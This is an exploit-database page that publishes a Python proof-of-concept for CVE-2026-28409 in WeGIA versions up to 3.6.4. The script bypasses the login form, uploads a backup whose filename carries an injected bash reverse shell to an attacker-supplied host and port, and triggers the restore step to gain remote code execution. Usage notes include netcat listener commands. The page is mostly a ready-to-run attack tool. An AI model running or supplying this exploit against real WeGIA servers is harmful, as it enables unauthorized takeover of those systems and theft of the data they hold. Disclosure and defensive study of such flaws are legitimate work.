---
title: WeGIA < = 3.6.4 Remote Code Execution via OS Command Injection
url: https://cxsecurity.com/issue/WLB-2026030009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-03
fetch_date: 2026-03-04T04:02:38.297451
---

# WeGIA < = 3.6.4 Remote Code Execution via OS Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WeGIA <= 3.6.4 Remote Code Execution via OS Command Injection** **2026.03.03**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28409](https://cxsecurity.com/cveshow/CVE-2026-28409/ "Click to see CVE-2026-28409")**  CWE: **[CWE-78 (Improper Neutralization of Special Elements used in an OS Command (&#039;OS Command Injection&#039;))](https://cxsecurity.com/cwe/CWE-78%20%28Improper%20Neutralization%20of%20Special%20Elements%20used%20in%20an%20OS%20Command%20%28%26#039;OS Command Injection&#039;)) "Click to see CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'))")** | |

#!/usr/bin/env python3
# Exploit Title: WeGIA <= 3.6.4 Remote Code Execution via OS Command Injection in Backup Restore
# CVE: CVE-2026-28409
# Date: 2026-02-28
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://github.com/LabRedesCefetRJ/WeGIA
# Software Link: https://github.com/LabRedesCefetRJ/WeGIA
# Affected: WeGIA <= 3.6.4
# Tested on:
# Category: Webapps
# Platform: PHP
# Exploit Type: Remote
# CVSS: 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
# CWE: CWE-78
# Description: OS Command Injection in backup/restore functionality allowing unauthenticated RCE when combined with authentication bypass
# Fixed in: 3.6.5
# Usage: python3 exploit.py <target\_url> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py http://192.168.1.100/WeGIA --lhost 192.168.1.50 --lport 4444
#
# Options:
# --lhost Attacker IP for reverse shell
# --lport Attacker listening port
#
# Notes:
# - Requires netcat listener: nc -lvnp <port>
# - Uses authentication bypass + command injection in filename during restore
# - Payload is reverse shell via bash
#
# How to Use
#
# Step 1: Start listener
# nc -lvnp 4444
#
# Step 2: Run exploit
# python3 exploit.py http://target/WeGIA --lhost 10.10.14.5 --lport 4444
import requests
import urllib3
import urllib.parse
import argparse
import sys
import time
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
BANNER = r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28409 • WeGIA Backup Restore Command Injection ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
"""
print(BANNER)
def parse\_args():
parser = argparse.ArgumentParser(description="WeGIA CVE-2026-28409 RCE Exploit")
parser.add\_argument("target", help="Target URL (e.g. http://192.168.1.100/WeGIA)")
parser.add\_argument("--lhost", required=True, help="Attacker IP for reverse shell")
parser.add\_argument("--lport", required=True, help="Attacker listening port")
return parser.parse\_args()
def build\_payload(lhost, lport):
revshell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
filename = f"dump;{revshell};poc.tar.gz"
return filename
def main():
args = parse\_args()
base\_url = args.target.rstrip('/')
lhost = args.lhost
lport = args.lport
session = requests.Session()
session.verify = False
malicious\_filename = build\_payload(lhost, lport)
print(f"[\*] Generated malicious filename: {malicious\_filename}")
dummy\_content = (
b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03"
b"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)
print("[\*] Attempting authentication bypass + admin session")
login\_url = f"{base\_url}/html/login.php"
bypass\_data = {
'c': 'true',
'cpf': 'admin',
'id\_pessoa': '1'
}
try:
r = session.post(login\_url, data=bypass\_data, timeout=10)
if r.status\_code != 200:
print(f"[-] Login bypass failed (status {r.status\_code})")
sys.exit(1)
print("[+] Auth bypass appears successful")
except Exception as e:
print(f"[-] Connection error during login: {e}")
sys.exit(1)
print("[\*] Uploading dummy backup with malicious filename")
upload\_url = f"{base\_url}/html/configuracao/importar\_dump.php"
files = {
'import': (malicious\_filename, dummy\_content, 'application/gzip')
}
upload\_data = {
'usuario': '1',
'id\_pessoa': '1'
}
try:
r = session.post(upload\_url, files=files, data=upload\_data, timeout=12)
if r.status\_code not in (200, 201, 302):
print(f"[-] Upload failed (status {r.status\_code})")
sys.exit(1)
print("[+] Upload completed")
except Exception as e:
print(f"[-] Upload error: {e}")
sys.exit(1)
print("[\*] Triggering restore → attempting RCE")
restore\_url = f"{base\_url}/html/configuracao/gerenciar\_backup.php"
params = {
'action': 'restore',
'file': malicious\_filename,
'usuario': '1',
'id\_pessoa': '1'
}
try:
r = session.get(restore\_url, params=params, allow\_redirects=False, timeout=15)
print("[\*] Restore request sent")
print("[\*] Check your listener for incoming reverse shell")
print(f"[\*] If no connection after 10-20s → target may be patched / firewall blocked / wrong path")
except Exception as e:
print(f"[-] Error during restore trigger: {e}")
print("\nExploit finished. Waiting for shell...\n")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm'...